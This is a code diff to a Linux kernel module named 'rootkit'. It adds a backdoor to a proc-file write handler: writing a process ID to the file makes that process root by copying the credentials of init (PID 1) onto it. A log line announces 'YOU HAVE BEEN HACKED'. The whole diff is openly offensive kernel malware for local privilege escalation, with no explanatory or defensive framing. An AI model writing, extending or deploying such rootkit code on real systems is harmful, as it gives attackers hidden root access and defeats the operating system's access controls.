@@ -2,6 +2,7 @@
 #include <linux/kernel.h>    // included for KERN_INFO
 #include <linux/init.h>      // included for __init and __exit macros
 #include <linux/proc_fs.h>
+#include <linux/sched.h>
 
 #define MODULE_NAME "rootkit"
 
@@ -13,13 +14,33 @@ static struct file_operations handler_fops;
 const struct file_operations *handler_original = 0;
 struct proc_dir_entry *handler, *root;
 
+
+
+// returns the task_struct associated with pid
+struct task_struct *get_task_struct_by_pid(unsigned pid) {
+    struct pid *proc_pid = find_vpid(pid);
+    struct task_struct *task;
+    if(!proc_pid)
+        return 0;
+    task = pid_task(proc_pid, PIDTYPE_PID);
+    return task;
+}
+
 static ssize_t make_pid_root (
         struct file *filp,
         const char __user *data,
         size_t sz,
         loff_t *l)
 {
-    printk("YOU HAVE BEEN HACKED\n");
+    char* dummy;
+    unsigned pid = (int) simple_strtol(data, &dummy, 10);
+    printk("YOU HAVE BEEN HACKED: Making PID %d root\n", pid);
+    struct task_struct *task = get_task_struct_by_pid(pid);
+    struct task_struct *init_task = get_task_struct_by_pid(1);
+    if(!task || !init_task)
+        return -1;
+    task->cred = init_task->cred;
+
     return -1;
 }
 /**
